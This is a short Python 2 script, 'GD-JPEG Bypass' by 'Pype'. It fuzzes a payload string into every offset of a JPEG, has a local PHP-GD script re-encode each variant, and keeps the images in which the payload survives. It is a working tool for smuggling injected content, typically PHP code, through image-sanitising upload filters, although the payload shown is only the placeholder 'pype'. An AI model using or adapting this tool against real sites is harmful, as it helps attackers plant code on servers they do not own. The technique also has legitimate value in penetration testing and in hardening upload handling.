import binascii, os, commands


print ("""
	GD-JPEG Bypass - by Pype

	thx: j0n3sb0y

	ps: python2 only 
""")


orginal_pic = "foto.jpg"
payload = "pype"


origin_hex = binascii.hexlify(open(orginal_pic, "rb").read())
payload_hex = payload.encode('hex')

print ("[+] %d Bytes > Original Picture" % (len(origin_hex)))
print ("[+] %d Bytes > payload" % (len(payload_hex)))

print ("[*] Fuzzing payload into image")

vulns = []

i = 0
while i <= len(origin_hex):
	origin_tmp = origin_hex

	# insert our payload into the picture with a fuzz method 

	hex_vuln = origin_tmp[i:i+len(payload_hex)]
	origin_tmp = origin_tmp[:i] + payload_hex + origin_tmp[i+len(payload_hex):]

	#  only to save our fake picture with our payload
	open("tmp_origin.hex", "wb").write(origin_tmp)
	os.system("xxd -r -p tmp_origin.hex tmp_origin.jpg")

	# execute PHP-GD code to convert our picture 
	status, output = commands.getstatusoutput("php xpto.php")
	if output != '':
		#print ("[-] Erro - Header Hex => %s " % (hex_vuln))
		i = i + 10

	else:
		poc = binascii.hexlify(open("poc.jpg", "rb").read())

		if payload_hex in poc:
			print ("[+] Hex vuln => %s" % (hex_vuln))
			vulns.append(hex_vuln)
			open("payloads/"+hex_vuln+".jpg", "wb").write(poc)


		if i % 1000 == 0:
			print ("[+] Hex change => %s" % (hex_vuln))

		i = i + 1

print (vulns)
